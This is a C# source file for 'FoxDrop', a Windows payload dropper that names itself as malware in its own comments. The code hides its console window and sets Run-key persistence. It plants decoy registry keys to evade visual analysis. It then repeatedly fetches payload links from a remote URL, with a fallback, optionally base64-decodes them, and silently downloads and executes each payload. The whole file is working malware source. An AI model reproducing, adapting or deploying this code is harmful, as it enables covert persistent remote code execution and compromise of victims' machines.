using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using static System.Net.Mime.MediaTypeNames;

namespace FoxDrop
{
    internal class Program
    {
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
        const int SW_SHOW = 5;

        protected static void SetStartup()
        {
            try
            {
                RegistryKey c = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);

                if (c.GetValue(Variables.registryFolderName) != null)
                {
                    Variables.debugLog("[!] Run Policy already present.");
                    Variables.IS_FIRST_EXECUTION_ON_SYSTEM = false;
                }
                else
                {
                    Variables.debugLog("[+] Added run policy for persistance on system reboot.");
                    c.SetValue(Variables.registryFolderName, Assembly.GetExecutingAssembly().Location);
                }
            } 
            catch { }
        }
        protected static void DropperCycle()
        {
            while(true)
            {
                try
                {
                    // Wait the delay.
                    Variables.debugLog($"[*] Waiting {Variables.BEACON_DELAY_MS} ms ...");
                    Thread.Sleep(Variables.BEACON_DELAY_MS);

                    // Checks if the current malware build has been executed on system before
                    if (Variables.IS_FIRST_EXECUTION_ON_SYSTEM)
                    {
                        Variables.debugLog($"[*] First execution on system: {Variables.IS_FIRST_EXECUTION_ON_SYSTEM.ToString().ToUpper()}.");

                        // Create the folder using the first 6 letters capitalized to avoid visual detection.
                        RegistryHelper.CreateRegistryFolder($"SOFTWARE\\{Variables.registryFolderName.Substring(0, Math.Min(6, Variables.registryFolderName.Length)).ToUpper()}");
                        Variables.debugLog($"[*] Folder \"{Variables.registryFolderName.Substring(0, Math.Min(6, Variables.registryFolderName.Length)).ToUpper()}\" created in the Registry.");

                        // ##                                                                                                ##
                        // ### Create the beacon's required key(s) & Decoy keys for lowering suspicion on visual analysis.  ###
                        // ##                                                                                                ##

                        // # Beacon Key, used to manage downloads with initial EMPTY value.
                        RegistryHelper.CreateRegistryKeys($"SOFTWARE\\{Variables.registryFolderName.Substring(0, Math.Min(6, Variables.registryFolderName.Length)).ToUpper()}", Variables.beaconKeyName, "EMPTY");
                        Variables.debugLog($"[*] Created {Variables.beaconKeyName} key.");

                        // # Decoy key #1
                        RegistryHelper.CreateRegistryKeys($"SOFTWARE\\{Variables.registryFolderName.Substring(0, Math.Min(6, Variables.registryFolderName.Length)).ToUpper()}", Variables.decoyKeyName1, Variables.decoyKeyValue1);
                        Variables.debugLog($"[*] Created \"{Variables.decoyKeyName1}\" key with value \"{Variables.decoyKeyValue1}\"");

                        // # Decoy key #2
                        RegistryHelper.CreateRegistryKeys($"SOFTWARE\\{Variables.registryFolderName.Substring(0, Math.Min(6, Variables.registryFolderName.Length)).ToUpper()}", Variables.decoyKeyName2, Variables.decoyKeyValue2);
                        Variables.debugLog($"[*] Created \"{Variables.decoyKeyName2}\" key with value \"{Variables.decoyKeyValue2}\".");

                        Variables.IS_FIRST_EXECUTION_ON_SYSTEM = false;
                    }

                    // Read the payload's download link
                    string payloadDownloadLink = new WebClient().DownloadString(Variables.BEACON_DOWNLOAD_CONTAINER_URL);
                    Variables.debugLog($"[*] Reading content from \"{Variables.BEACON_DOWNLOAD_CONTAINER_URL}\".");

                    if(!payloadDownloadLink.Contains(Variables.BEACON_FALLBACK_KILLSWITCH_STRING)) 
                    {
                        Variables.debugLog($"[*] String value not found, switching to fallback url \"{Variables.BEACON_DOWNLOAD_CONTAINER_URL_FALLBACK}\".");
                        payloadDownloadLink = new WebClient().DownloadString(Variables.BEACON_DOWNLOAD_CONTAINER_URL_FALLBACK);
                    }

                    // Get every payload download link individually.
                    string[] payloadLinks = payloadDownloadLink.Split(new char[] { '\n' });

                    // Iterate throughout each link individually.
                    foreach (string payloadLink in payloadLinks)
                    {
                        if (String.IsNullOrEmpty(payloadLink) || payloadLink == Variables.BEACON_FALLBACK_KILLSWITCH_STRING)
                            continue;

                        string LinkAndFileName = payloadLink;

                        if (Variables.ARE_PAYLOAD_LINKS_BASE64) // Decode Base64 Links if present.
                            LinkAndFileName = Encoding.UTF8.GetString(Convert.FromBase64String(LinkAndFileName));

                        Variables.debugLog($"[*] Loaded following data: \"{LinkAndFileName}\"");

                        // Load registry folder
                        RegistryKey c = Registry.CurrentUser.OpenSubKey($"SOFTWARE\\{Variables.registryFolderName.Substring(0, Math.Min(6, Variables.registryFolderName.Length)).ToUpper()}", true);

                        // Read existing md5 payload lists
                        string payloadListMD5 = c.GetValue(Variables.beaconKeyName).ToString();

                        // Check if payload was not already executed in the system before.
                        if (!payloadListMD5.Contains(Hashing.CalculateMD5(LinkAndFileName.Split(';')[0])))
                        {
                            // Tries to download and execute the payload, silently, regardless of success or not.
                            try
                            {
                                Variables.debugLog($"[*] Downloading & executing payload from \"{LinkAndFileName.Split(';')[0]}\"");

                                // Download the payload from the link to the folder.
                                new WebClient().DownloadFile(LinkAndFileName.Split(';')[0], LinkAndFileName.Split(';')[1]);
                                Variables.debugLog($"[*] Downloaded payload to {LinkAndFileName.Split(';')[1]}");

                                // Execute the payload as a process.
                                Process.Start(LinkAndFileName.Split(';')[1]);
                                Variables.debugLog($"[*] Payload started from {LinkAndFileName.Split(';')[1]}");

                                c.SetValue(Variables.beaconKeyName, payloadListMD5 + "\n" + Hashing.CalculateMD5(LinkAndFileName.Split(';')[0]));
                                Variables.debugLog($"[*] Payload hash (md5) added to list to prevent re-execution.");
                            }
                            catch { }
                        }
                        else
                        {
                            Variables.debugLog("[!] Payload already executed in the system before, aborting.\n");
                        }
                    }
                }
                catch
                { }

            }
        }

        static void Main(string[] args)
        {
            /*
            /////////////////////////////////////////////////////////
            //         ______           ____                       //
            //        / ____/___  _  __/ __ \_________  ____       //
            //       / /_  / __ \| |/_/ / / / ___/ __ \/ __ \      //
            //      / __/ / /_/ />  </ /_/ / /  / /_/ / /_/ /      //
            //     /_/    \____/_/|_/_____/_/   \____/ .___/       //
            //      by Luigi Fiore aka lypd0        /_/            //
            //                                                     //
            //             New-Gen Payload Dropper 1.0             //
            //                 for Windows Systems                 //
            //                                                     //
            /////////////////////////////////////////////////////////
            */

            // Start variable troubleshooting checks
            if(Variables.TROUBLESHOOTING_CHECKS_ENABLED)
            {
                Variables.variablesTroubleshooting();
                return;
            }

            var handle = GetConsoleWindow();

            if(!Variables.DEBUG_VIEW) 
                ShowWindow(handle, SW_HIDE);

            // Setup Persistance
            SetStartup();

            // Start Dropper Thread
            new Thread(() => { DropperCycle(); }).Start(); 
            Console.ReadLine();


        }
    }
}